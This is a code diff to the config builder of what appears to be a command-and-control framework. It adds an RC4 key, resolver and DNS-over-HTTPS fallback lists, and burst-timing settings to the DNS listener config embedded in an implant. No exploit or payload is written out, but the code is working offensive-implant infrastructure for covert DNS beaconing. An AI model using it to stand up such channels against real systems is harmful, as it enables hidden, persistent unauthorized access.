@@ -1022,21 +1022,58 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 	case handlers.LISTENER_DNS:
 		var Config = b.config.ListenerConfig.(*handlers.DNS)
 
-		// The agent resolves every C2 record through the system resolver, so
-		// only the domain is needed. The polling interval is carried so the
-		// operator can tune it from the listener without recompiling.
-		DemonConfig.AddWString(Config.Config.Domain)
-		DemonConfig.AddInt32(int32(Config.Config.Frequency))
+		// The agent and the teamserver have to agree on the effective
+		// configuration, so the builder normalizes it the same way the
+		// listener does when it starts.
+		dnsConfig, err := handlers.NormalizeDNSConfig(Config.Config)
+		if err != nil {
+			logger.Error("Failed to normalize the DNS listener configuration: " + err.Error())
+			return nil, err
+		}
 
-		DemonConfig.AddInt64(Config.Config.KillDate)
+		// The listener keeps the effective configuration, so that the agent
+		// and the teamserver always use the same encryption key.
+		Config.Config = dnsConfig
 
-		WorkingHours, err := common.ParseWorkingHours(Config.Config.WorkingHours)
+		// The agent resolves every C2 record through the configured domain.
+		// The polling interval is carried so the operator can tune it from
+		// the listener without recompiling.
+		DemonConfig.AddWString(dnsConfig.Domain)
+		DemonConfig.AddInt32(int32(dnsConfig.Frequency))
+
+		DemonConfig.AddInt64(dnsConfig.KillDate)
+
+		WorkingHours, err := common.ParseWorkingHours(dnsConfig.WorkingHours)
 		if err != nil {
 			logger.Error("Failed to parse the WorkingHours: " + err.Error())
 			return nil, err
 		}
 
 		DemonConfig.AddInt32(WorkingHours)
+
+		// RC4 key that protects the DNS payloads.
+		EncryptKey, err := handlers.DNSCryptKey(dnsConfig.EncryptKey)
+		if err != nil {
+			logger.Error("Failed to parse the DNS EncryptKey: " + err.Error())
+			return nil, err
+		}
+		DemonConfig.AddBytes(EncryptKey)
+
+		// Transport tuning.
+		DemonConfig.AddInt32(int32(dnsConfig.PktSize))
+		DemonConfig.AddInt32(int32(dnsConfig.TTL))
+
+		BurstEnabled := int32(0)
+		if dnsConfig.BurstEnabled {
+			BurstEnabled = 1
+		}
+		DemonConfig.AddInt32(BurstEnabled)
+		DemonConfig.AddInt32(int32(dnsConfig.BurstSleep))
+		DemonConfig.AddInt32(int32(dnsConfig.BurstJitter))
+
+		// Resolver lists used for the plain DNS and the DoH fallback.
+		DemonConfig.AddWString(dnsConfig.Resolvers)
+		DemonConfig.AddWString(dnsConfig.DohResolvers)
 
 		break
 	}
